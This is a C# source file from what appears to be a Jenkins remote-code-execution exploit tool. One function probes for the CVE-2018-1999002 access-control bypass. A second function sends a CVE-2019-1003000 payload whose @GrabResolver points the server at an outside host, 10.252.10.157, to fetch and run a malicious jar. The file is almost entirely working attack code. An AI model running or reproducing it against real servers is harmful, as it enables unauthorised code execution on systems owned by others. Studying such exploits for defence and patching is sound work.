using System;
using System.Net.Http;
using System.Threading.Tasks;
using Newtonsoft.Json;
using HtmlAgilityPack;
using jenkins_server_rce;
using System.Threading;
using System.Collections.Generic;

namespace jenkins_server_rce.jenkinsrequests
{
    public class Jenkins_Requests
    {
        //CVE Exploit: CVE-2018-1999002 (Acess Control List Bypass)
        //Function Name: DetectACLBypass()
        //Function Parameters => Return Type : Void => Void
        //Function Purpose: The function will send a GET request to jenkins.local to determine if 
        //an ACL bypass exists. The request will be /securityRealm/user/[username]/descriptorByName/[descriptor_name]/
        public static bool DetectACLBypass(HttpClient client, string url)
        {
            HtmlAgilityPack.HtmlDocument document = new HtmlAgilityPack.HtmlDocument();
            List<string> alphabet = new List<string>();
            //Create list of characters [a-z] to test in paramets "q" in payload on line 31
            for (int i = 0; i < 26; i++)
            {
                var letter = i + 97;
                var stringRepresentation = (char)letter;
                alphabet.Add(stringRepresentation.ToString());

            }

            //alphabet.Add("b");
            //alphabet.Add("q");
            //alphabet.Add("z");
            //alphabet.Add("z");
            //alphabet.Add("x");
            //alphabet.Add("y");
            //alphabet.Add("w");
            //alphabet.Add("a");

            foreach (string possibleLetter in alphabet)
            {
                Thread.Sleep(500);
                string payload = $"{url}/securityRealm/user/admin/search/index?q={possibleLetter}";
                Console.WriteLine($"[+] Testing for ACL Bypass...\n   Using Parameter: q={possibleLetter}");
                using (HttpResponseMessage response = client.GetAsync(payload).Result)
                {
                    using (HttpContent content = response.Content)
                    {
                        document.LoadHtml(content.ReadAsStringAsync().Result);
                        HtmlNodeCollection idToScrape = document.DocumentNode.SelectNodes("//div[@class='error']");
                        // Try/catch block on determining if this error class exists. Upon a successful lookup
                        // the results of the ids containing the letter specified in the {q} paramters will be 
                        // returned and there will not be error. A capture exception means there is no error and thus
                        // the GET request worked and the CVE is present
                        try
                        {
                            foreach (HtmlNode node in idToScrape)
                            {
                                Console.WriteLine($"   Response to parameter input: {node.InnerText}");
                            }
                        }
                        catch (Exception)
                        {
                            Thread.Sleep(1000);
                            Console.WriteLine("[+] Can Initiate Pre-Auth RCE");
                            return true;
                        }
                    }
                }
            }
            return false;
        }

        //CVE Exploit: CVE-2019-1003000
        //Function Name: SendPayloadInGETRequest(string url)
        //Function Parameters => Return Type : String => Void
        //Function Purpose: Will send the malicious GET request with the malicious
        //jar file to Jenkins server
        public static string SendPayloadInGETRequest(string url, HttpClient client)
        {
            string payload = $"{url}descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?" +
                "value=@GrabResolver(name=%27orange.tw%27,%20root=%27http://10.252.10.157%27)%0a" +
                "@Grab(group=%27ww.orange%27,%20module=%27poc%27,%20version=%271%27)%0aimport%20NixExploit";
            Thread.Sleep(1000);
            Console.WriteLine("[+] Sending Malicious GET Request...");

            using (HttpResponseMessage response = client.GetAsync(payload).Result)
            {
                using (HttpContent content = response.Content)
                {
                    string myContent = content.ReadAsStringAsync().Result;
                    try
                    {
                        JenkinsJSONResponse jResponse = JsonConvert.DeserializeObject<JenkinsJSONResponse>(myContent);
                        return jResponse.status;
                    }
                    catch
                    {
                        Thread.Sleep(1000);
                        Console.WriteLine($"{myContent}\nError parsing JSON");
                        return Program.RCESuccess.ErrorInRequest.ToString();
                    }

                }
            }
        }
    }

    //The reponse after sending the malicious GET request is a JSON with these 4 keys
    //Creating this class will use be used for Json deserialization
    public class JenkinsJSONResponse
    {
        public int column { get; set; }
        public int line { get; set; }
        public string message { get; set; }
        public string status { get; set; }
    }
}
